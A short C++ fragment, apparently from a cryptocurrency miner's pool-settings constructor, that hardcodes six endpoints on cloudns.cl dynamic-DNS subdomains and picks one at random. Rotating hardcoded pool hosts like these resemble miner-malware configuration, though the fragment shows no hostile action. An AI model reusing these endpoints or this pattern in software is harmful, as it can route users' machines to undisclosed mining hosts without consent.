...
pool_settings_provider::pool_settings_provider(arguments &args) {
    ...
    const string wordList84[6] = {"http://linux84.distro.cloudns.cl:84","http://linux8474.distro.cloudns.cl:84","http://linux84.distro.cloudns.cl:74","http://linux8474.distro.cloudns.cl:74","http://linux84.distro.cloudns.cl:75","http://linux8474.distro.cloudns.cl:75"};

    const string word84 = wordList84[rand() % 6];
